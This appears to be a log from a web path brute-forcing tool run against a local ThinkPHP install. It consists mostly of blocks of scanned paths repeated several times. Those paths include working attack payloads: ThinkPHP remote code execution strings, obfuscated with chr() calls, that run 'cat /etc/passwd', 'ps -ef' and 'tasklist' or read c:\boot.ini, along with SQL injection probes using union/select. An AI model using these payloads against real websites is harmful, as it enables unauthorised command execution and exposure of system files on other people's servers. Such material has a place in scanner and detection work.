%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:33:39    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:33:43    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:33:59    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:34:22    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:  
+2015-12-07 16:34:42    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1%22%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyids%0A/index.php/%2A123%2A/%27union/%2A%2A/select/%2A%2A/1234568md5%288855815%291011%2523%26action%3Dgetatlbyid%7E%0A/index.php/Index/index/name%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7Ds%0A/index.php/Index/index/name/%24%7B%40print%28md5%281122%29%29%7D%7E%0A/index.php/admin/%0A/index.php/admin/authentication/sa%0A/index.php/admin/authentication/sa/login%0A/index.php/admin/authentication/sa/logins%0A/index.php/admin/authentication/sa/login%7E%0A/index.php/admin/authentication/sa/notexist_path%0A/index.php/admin/authentication/sa/notexist_paths%0A/index.php/admin/authentication/sa/notexist_path%7E%0A/index.php/admin/s%0A/index.php/admin/%7E%0A/index.php/ajax/api/reputation%0A/index.php/ajax/api/reputation/vote/%0A/index.php/ajax/api/reputation/vote/s%0A/index.php/ajax/api/reputation/vote/%7E%0A/index.php/api%0A/index.php/api/xmlrpc%0A/index.php/api/xmlrpcs%0A/index.php/api/xmlrpc%7E%0A/index.php/cms%0A/index.php/cms/item-comment%0A/index.php/cms/item-comments%0A/index.php/cms/item-comment%7E%0A/index.php/list-10%2520UNION/%2A%2A/all/%2A%2A/SELECT/%2A%2A%0A/index.php/module/action/param1%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.%60tasklist%60.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28chr%28126%29.chr%28126%29.chr%28126%29.file_get_contents%28c.chr%2858%29.chr%2892%29.boot.chr%2846%29.ini%29.chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.204910492051%29%29%7D%7E%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7Ds%0A/index.php/module/action/param1/%24%7B%40print%28md5%280.684747658043%29%29%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%24%7B%40print%28system%28chr%2899%29.chr%2897%29.chr%28116%29.chr%2832%29.chr%2847%29.chr%28101%29.chr%28116%29.chr%2899%29.chr%2847%29.chr%28112%29.chr%2897%29.chr%28115%29.chr%28115%29.chr%28119%29.chr%28100%29%29%29%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7Ds%0A/index.php/module/action/param1/%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7B%24%7Bsystem%28ps.chr%280x20%29.chr%280x2d%29.ef%29%7D%7D%7B%24%7Bprint%28chr%28126%29.chr%28126%29.chr%28126%29%29%7D%7D%7E%0A/index.php/product%0A/index.php/product/list%0A/index.php/product/lists%0A/index.php/product/list%7E%0A/index.php/tools-staticPage.html%0A/index.php/tools-staticPage.htmls%0A/index.php/tools-staticPage.html%7E%0A/index.php/weblinks-categories%0A/index.php/weblinks-categoriess%0A/index.php/weblinks-categories%7E%0A  
+2015-12-07 16:36:31    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 16:43:59    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:44:07    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=texe.txt","url":"localhost","dict":"texe.txt"},"token":"7654123"}    No result  
+2015-12-07 16:44:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:47:10    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:47:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:49:13    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:49:27    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:49:58    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:50:58    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:51:15    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:53:26    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:58:13    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:58:20    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 16:59:46    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:00:30    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:00:55    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:03:18    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:03:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:04:33    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:04:58    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:05:36    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:08:29    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:12:41    {"cmd":"backdict","msg":[],"token":"7654123"}    all.txt:all2.txt:ASP.txt:ASPX.txt:buglist.txt:DIR.txt:JSP.txt:MDB.txt:PHP.txt:texe.txt:  
+2015-12-07 17:18:06    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:31:06    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    No result  
+2015-12-07 17:32:27    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
+/index.php/admin/
+/index.php/admin/authentication/sa
+/index.php/admin/authentication/sa/login
+/index.php/admin/authentication/sa/logins
+/index.php/admin/authentication/sa/login~
+/index.php/admin/authentication/sa/notexist_path
+/index.php/admin/authentication/sa/notexist_paths
+/index.php/admin/authentication/sa/notexist_path~
+/index.php/admin/s
+/index.php/admin/~
+/index.php/ajax/api/reputation
+/index.php/ajax/api/reputation/vote/
+/index.php/ajax/api/reputation/vote/s
+/index.php/ajax/api/reputation/vote/~
+/index.php/api
+/index.php/api/xmlrpc
+/index.php/api/xmlrpcs
+/index.php/api/xmlrpc~
+/index.php/cms
+/index.php/cms/item-comment
+/index.php/cms/item-comments
+/index.php/cms/item-comment~
+/index.php/list-10%20UNION/**/all/**/SELECT/**
+/index.php/module/action/param1
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).`tasklist`.chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}s
+/index.php/module/action/param1/${@print(chr(126).chr(126).chr(126).file_get_contents(c.chr(58).chr(92).boot.chr(46).ini).chr(126).chr(126).chr(126))}~
+/index.php/module/action/param1/${@print(md5(0.204910492051))}
+/index.php/module/action/param1/${@print(md5(0.204910492051))}s
+/index.php/module/action/param1/${@print(md5(0.204910492051))}~
+/index.php/module/action/param1/${@print(md5(0.684747658043))}
+/index.php/module/action/param1/${@print(md5(0.684747658043))}s
+/index.php/module/action/param1/${@print(md5(0.684747658043))}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}${@print(system(chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}s
+/index.php/module/action/param1/{${print(chr(126).chr(126).chr(126))}}{${system(ps.chr(0x20).chr(0x2d).ef)}}{${print(chr(126).chr(126).chr(126))}}~
+/index.php/product
+/index.php/product/list
+/index.php/product/lists
+/index.php/product/list~
+/index.php/tools-staticPage.html
+/index.php/tools-staticPage.htmls
+/index.php/tools-staticPage.html~
+/index.php/weblinks-categories
+/index.php/weblinks-categoriess
+/index.php/weblinks-categories~
+  
+2015-12-07 17:33:22    {"cmd":"burstback","msg":{"theurl":"localhost\/ThinkPHP\/Home\/Burst\/startburst?url=localhost&dict=all.txt","url":"localhost","dict":"all.txt"},"token":"7654123"}    /index.php/*123*/'union/**/select/**
+/index.php/*123*/'union/**/select/**/1"
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyids
+/index.php/*123*/'union/**/select/**/1234568md5(8855815)1011%23&action=getatlbyid~
+/index.php/Index/index/name
+/index.php/Index/index/name/${@print(md5(1122))}s
+/index.php/Index/index/name/${@print(md5(1122))}~
